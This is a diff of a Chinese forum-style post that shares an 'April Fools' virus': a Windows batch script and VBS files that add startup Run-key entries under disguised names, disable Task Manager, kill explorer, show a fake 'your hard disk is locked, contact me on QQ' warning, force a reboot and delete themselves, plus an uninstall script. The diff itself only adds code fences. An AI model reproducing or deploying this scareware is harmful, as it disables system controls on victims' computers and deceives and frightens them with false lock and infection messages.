@@ -16,6 +16,7 @@ ViewNums: 5796
 :: 友情提醒您:源码仅供学习交流用,写成恶意脚本危害他人者,后果自负!
 @echo off & setlocal EnableDelayedExpansion
 echo MsgBox "亲爱的朋友,由于你的机器非法使用了逍遥@浪子@提供的P处理,硬盘已经被锁死,若想解锁硬盘,请联系浪子!~   QQ:422547345 ", 16, "警告!" > C:v.vbs
+```
 reg add "HKLMSOFTWAREMicrosoftWindowsCurrentVersionRun" /v Autodesk /t REG_SZ /d C:v.vbs /f
 reg add "HKLMSOFTWAREMicrosoftWindowsCurrentVersionRun" /v AutoCAD /t REG_SZ /d C:shouhu.vbs /f
 reg add "HKEY_CURRENT_USERSoftwareMicrosoftWindowsCurrentVersionPoliciesSystem" /v DisableTaskMgr /t reg_dword /d 00000001 /f
@@ -71,9 +72,9 @@ taskkill /F /im explorer.exe 1>nul & start explorer.exe & start shutdown.vbs
 ping 127.0.0.1 -n 300 >nul
 shutdown -r -f -t 10 -c "浪子友情提醒你,由于你多次选择稍后重启系统,导致病毒无法正常运行,浪子决定立刻重新启动!"
 del %0
-
+```
 以上为主程序,可以保存为任意名字.CMD执行
-
+```
 do
 x = Msgbox("病毒安装完毕!重新启动后生效!是否立刻重新启动电脑?   立刻重启选[是]    稍后重启选[否] ", 4, "是否重新启动?")
 Set WshShell = WScript.CreateObject("WScript.Shell")
@@ -86,9 +87,9 @@ If x = 7 Then
 Wscript.sleep 60000
 End If
 loop
-
+```
 这段为shutdown.vbs内容
-
+```
 do
 Wscript.Sleep 10000
 MsgBox "亲爱的朋友,你电脑已经中了愚人节病毒,现在,病毒将迈着矫健的步伐,通过你的身体.... ", 16, "警告!"
@@ -113,9 +114,9 @@ MsgBox "如果今天晚上有颗星星掉下来砸到了你的头上请不要担
 Wscript.Sleep 10000
 MsgBox "亲爱的朋友,愚人节快乐!本程序将在24小时后自己卸载,不会对你系统造成任何危害。 ", 64, "愚人节快乐!"
 loop
-
+```
 这段为VBS.VBS内容
-
+```
 echo Windows Registry Editor Version 5.00 >autorun.reg
 echo. >>autorun.reg
 echo [HKEY_CURRENT_USERSoftwareMicrosoftWindowsCurrentVersionPoliciesExplorer] >>autorun.reg
@@ -133,7 +134,7 @@ reg delete "HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindowsCurrentVersionRun" /v Auto
 reg add "HKEY_CURRENT_USERSoftwareMicrosoftWindowsCurrentVersionPoliciesSystem" /v DisableTaskMgr /t reg_dword /d 00000000 /f
 for %%d in (process.ini,shouhu.vbs,taskkill.cmd,vbs.vbs,restart.cmd,shutdown.vbs) do if exist C:\%%d del C:\%%d /q
 taskkill /F /im explorer.exe 1>nul & start explorer.exe
-
+```
 这段为卸载程序unstall.CMD
 
 纯粹为写着玩,希望大家能开发出更有创意的P,共同交流,学习进步!~
